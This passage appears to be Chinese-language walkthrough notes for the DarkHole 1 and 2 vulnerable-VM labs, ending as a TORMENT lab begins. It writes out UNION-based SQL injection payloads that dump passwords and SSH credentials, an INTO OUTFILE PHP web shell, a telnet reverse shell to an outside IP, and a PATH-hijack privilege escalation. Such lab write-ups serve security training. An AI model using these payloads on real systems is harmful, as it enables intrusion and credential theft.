1" union select 1,2,group_concat(pass) from users#

1" union select 1,2,group_concat(user) from users#
```
![image.png](https://s2.loli.net/2025/06/06/1Yw6SKlvpqMiGPR.png)

![image.png](https://s2.loli.net/2025/06/06/X8iHOGWDcKFLeNR.png)

#### 解码密码
![image.png](https://s2.loli.net/2025/06/06/QiJs6B5eDYaAOlM.png)

![image.png](https://s2.loli.net/2025/06/06/QqbPN1THjfsCkla.png)

![image.png](https://s2.loli.net/2025/06/06/VjmNQWGsgRaH1p3.png)

## 2. sql 注入插马
```
1" union select '<?php system($_GET[cmd]);?>',2,3 into outfile "/var/www/html/uploads/shell.php"#

```
![image.png](https://s2.loli.net/2025/06/06/9iIR7Sv2dA6pBGU.png)

![image.png](https://s2.loli.net/2025/06/06/fdxtROlhiSE7Nms.png)

反弹 shell
```
mkfifo+/tmp/test;telnet+61.139.2.128+2334+0</tmp/test|/bin/sh+>+/tmp/test
```
![image.png](https://s2.loli.net/2025/06/06/9SYBaZzUg8NP2im.png)

![image.png](https://s2.loli.net/2025/06/06/DajOpYRLqrefIBZ.png)

## ssh 登录，提权
![image.png](https://s2.loli.net/2025/06/06/iZH5egbqOwNAtkW.png)

![image.png](https://s2.loli.net/2025/06/06/kEpsXyZPAdmURob.png)

并无东西

在看/etc/passwd 中找到 bob 用户和 eric 用户

### linpeas 信息收集
定时任务
![image.png](https://s2.loli.net/2025/06/06/TKESbFf7O32csGe.png)

端口
![image.png](https://s2.loli.net/2025/06/06/m5FLpE61g34qOTK.png)

![image.png](https://s2.loli.net/2025/06/06/bj9emOAy6EzXG3f.png)

在/var/www/html发现root权限的程序。
![image.png](https://s2.loli.net/2025/06/06/NIfTydO9tWmbzgU.png)

没啥发现。要运行看
![image.png](https://s2.loli.net/2025/06/06/G9LY8oRiHSeZc3Q.png)

有个 ps

## 环境变量劫持
```
cd /tmp
echo "/bin/sh" > ps
chmod 777 ps
export PATH=/tmp:$PATH
echo $PATH
```

![image.png](https://s2.loli.net/2025/06/06/uyZ6Tn8W9SsmAJj.png)

![image.png](https://s2.loli.net/2025/06/06/CbYPx4e8RpUHEKZ.png)

提权成功

# darkhole 2
[[darkhole2]]
## 扫描端口
![image.png](https://s2.loli.net/2025/06/08/v6ELrtQql1xOp7f.png)

## web 服务信息收集
![image.png](https://s2.loli.net/2025/06/08/RVmplUxPuJqDdh3.png)

有 config 文件，但访问进去没有东西

有个登录界面
![image.png](https://s2.loli.net/2025/06/08/Aqs21Qiz7gOhP8Y.png)

扫描带后缀路径
![image.png](https://s2.loli.net/2025/06/08/1tcC6pk2TagzNJv.png)

也是没东西。继续扫描
![image.png](https://s2.loli.net/2025/06/08/ngrhZu1fS5pBXtm.png)

发现有 git

![image.png](https://s2.loli.net/2025/06/08/KqToDSyeBUs7NIz.png)

用 git dumper 提取
![image.png](https://s2.loli.net/2025/06/08/TBPmxj14bHYNUt9.png)

找到数据库的密码和账户

![image.png](https://s2.loli.net/2025/06/08/XUqoJaF5cDhgMp9.png)

在翻找的时候疑似找到账密了

### git 用法
#### git log
能找到用户更新的历史记录
![image.png](https://s2.loli.net/2025/06/08/yb5j2L8WDwaO1Ek.png)


#### git diff 
对比 git 历史的区别。从而找到更新的地方

也是从这里找到作者更新的账密
![image.png](https://s2.loli.net/2025/06/08/9IJskEOVYpUzPrf.png)

## sql 注入
### sqlmap
```
sqlmap -u http://192.168.122.130/dashboard.php?id=1 --cookie PHPSESSID=o7p73ppt89jueopfnb5tugf8ov --dbs

```
![image.png](https://s2.loli.net/2025/06/08/AfoqzKUeLBclJY6.png)


找到 ssh 登录密码
![image.png](https://s2.loli.net/2025/06/08/gIwqBEcyeWKxaA2.png)


### sql 手工注入
#### 判断类型
```
1'%20%20 and%20%20 1=1%20 --+

1'%20%20 and%20%20 2=1%20 --+
```

![image.png](https://s2.loli.net/2025/06/08/8cAda3jGboSBs7Z.png)

第二个却发现报错，说明是字符型注入
![image.png](https://s2.loli.net/2025/06/08/7mJCKibpogrDAl3.png)

#### 判断注入点
```
1' order by 7--+
1' order by 6--+
```
![image.png](https://s2.loli.net/2025/06/08/jPCVilDfYu2Rt1X.png)


![image.png](https://s2.loli.net/2025/06/08/zBlxIHGLYE3JAO5.png)

7 是报错，而 6 是没报错。说明注入点在 6

#### 找回显位置
```
-1' union select%20 1,2,3,4,5,6 --+
```
![image.png](https://s2.loli.net/2025/06/08/9H2IV4cC1RbAG6w.png)

#### 查信息
```
-1' union select%20 1,database(),3,4,5,6 --+


-1' union select 1,2,3,4,5,group_concat(table_name) from information_schema.tables where table_schema = database() --+




-1' union select 1,2,3,4,5,group_concat(column_name) from information_schema.columns WHERE table_name='users' --+
```
![image.png](https://s2.loli.net/2025/06/08/7urVTDE4O9vJ3Up.png)

![image.png](https://s2.loli.net/2025/06/08/a8mW2K91bDCzFHX.png)



```
-1' union select 1,2,3,4,5,group_concat(column_name) from information_schema.columns WHERE table_name='ssh' --+

-1' union select 1,2,3,id,user,pass from ssh --+
```

![image.png](https://s2.loli.net/2025/06/08/47mNOhMTkByKqtz.png)

找到 ssh 的账户密码

![image.png](https://s2.loli.net/2025/06/08/HeMNvBGQpAf4sdr.png)


## 提权
用账户密码登录 jehad 的用户
![image.png](https://s2.loli.net/2025/06/08/hgNOA2oErdT3zit.png)


### linpeas 信息收集
![image.png](https://s2.loli.net/2025/06/08/XiBcGAoWgl9yjZR.png)

定时任务
![image.png](https://s2.loli.net/2025/06/08/hCniE25K1dlDHQL.png)


### curl 命令
我们看定时任务的具体内容
![image.png](https://s2.loli.net/2025/06/08/THEZmesfnrPSUpI.png)

发现是个 cmd 的命令执行、用 curl 测试一下

![image.png](https://s2.loli.net/2025/06/08/3elkXHFEZ2xcTND.png)

居然成了。那我们想办法访问 losy 的历史记录

![image.png](https://s2.loli.net/2025/06/08/Tr6REqp7ineowkx.png)

有报错。把空格改成%20
![image.png](https://s2.loli.net/2025/06/08/JwYg6T2uk7WicCd.png)
出来了

找到了密码
![image.png](https://s2.loli.net/2025/06/08/YSvPC9kwHE8GrT3.png)


## ssh 登录 losy
会发现 python 有 root 权限
![image.png](https://s2.loli.net/2025/06/08/JDZkciIK3Eqjhya.png)

我们写一个反弹 shell 的脚步，用 root 权限执行，即可获得 root 权限的反弹 shell

反弹 shell
![image.png](https://s2.loli.net/2025/06/08/M2D4rz9xLTEZSJq.png)


# digitalworld.local: TORMENT
## nmap 扫描端口
![image.png](https://s2.loli.net/2025/06/06/BK7SeX1ag8fsit9.png)

继续收集
![image.png](https://s2.loli.net/2025/06/06/fyZiQVlYUCxgd8J.png)

有 smb 服务
![image.png](https://s2.loli.net/2025/06/06/MAvGZVSPgrRmzap.png)
